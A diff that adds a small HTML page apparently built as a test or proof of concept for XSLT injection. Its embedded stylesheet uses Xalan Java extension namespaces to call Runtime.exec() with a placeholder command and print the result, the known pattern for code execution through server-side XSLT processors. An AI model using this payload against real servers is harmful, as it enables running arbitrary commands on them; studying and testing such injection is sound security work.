@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSLT Transformation</title>
+</head>
+<body>
+    <div id="output"></div>
+    <script>
+        function loadXMLString(txt) {
+            var parser = new DOMParser();
+            return parser.parseFromString(txt, "text/xml");
+        }
+
+        var xslText = `
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+           <xsl:template match="/">
+             <xsl:variable name="rtobject" select="rt:getRuntime()"/>
+             <xsl:variable name="process" select="rt:exec($rtobject,'jazze')"/>
+             <xsl:variable name="processString" select="ob:toString($process)"/>
+             <span><xsl:value-of select="$processString"/></span>
+           </xsl:template>
+         </xsl:stylesheet>
+        `;
+
+        var xmlText = "<s></s>";
+
+        var xslDoc = loadXMLString(xslText);
+        var xmlDoc = loadXMLString(xmlText);
+
+        if (xslDoc.documentElement.nodeName === "parsererror" || xmlDoc.documentElement.nodeName === "parsererror") {
+            document.getElementById("output").innerHTML = "Error parsing XML.";
+        } else {
+            var xsltProcessor = new XSLTProcessor();
+            xsltProcessor.importStylesheet(xslDoc);
+            var resultDocument = xsltProcessor.transformToFragment(xmlDoc, document);
+            document.getElementById("output").appendChild(resultDocument);
+        }
+    </script>
+</body>
+</html>
